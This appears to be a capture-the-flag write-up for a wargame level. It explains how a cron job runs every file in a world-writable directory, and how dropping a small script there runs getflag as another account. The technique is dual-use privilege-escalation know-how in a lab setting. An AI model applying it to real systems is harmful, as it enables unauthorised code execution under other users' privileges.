###Level 03

####Introduction
In this example we are told to look at the directory /home/flag03 and that there is a crontab that runs every few minutes
That directory contains the file `writable.sh` which contains the code
```
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
Which runs every file in the writable.d directory. I assume this is the file being run by the cron job.

####Exploit
Since `home/flag/03/writable.d` is writable I create a simple bash script that will run the `getflag` command and pipe output to a file
so that I can confirm it ran
```
#bin/bash
/bin/getflag >> /tmp/proof
```

I waited a few minutes and sure enough `tmp/proof` contained `You have successfully executed getflag on a target account`
